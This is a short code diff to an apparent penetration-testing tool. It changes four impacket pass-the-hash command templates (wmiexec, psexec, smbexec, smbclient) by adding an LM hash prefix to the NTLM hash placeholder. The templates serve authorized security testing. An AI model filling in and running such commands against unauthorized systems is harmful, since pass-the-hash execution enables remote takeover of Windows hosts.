@@ -43,25 +43,25 @@ const commands: Command[] = [
   {
     name: "impacket-wmiexec (NTLM)",
     template:
-      "impacket-wmiexec '{domain}'/'{username}'@'{targetHost}' -hashes '{ntlmHash}'",
+      "impacket-wmiexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
     authType: "ntlmHash",
   },
   {
     name: "impacket-psexec (NTLM)",
     template:
-      "impacket-psexec '{domain}'/'{username}'@'{targetHost}' -hashes '{ntlmHash}'",
+      "impacket-psexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
     authType: "ntlmHash",
   },
   {
     name: "impacket-smbexec (NTLM)",
     template:
-      "impacket-smbexec '{domain}'/'{username}'@'{targetHost}' -hashes '{ntlmHash}'",
+      "impacket-smbexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
     authType: "ntlmHash",
   },
   {
     name: "impacket-smbclient (NTLM)",
     template:
-      "impacket-smbclient '{domain}'/'{username}'@'{targetHost}' -hashes '{ntlmHash}'",
+      "impacket-smbclient '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
     authType: "ntlmHash",
   },
   {
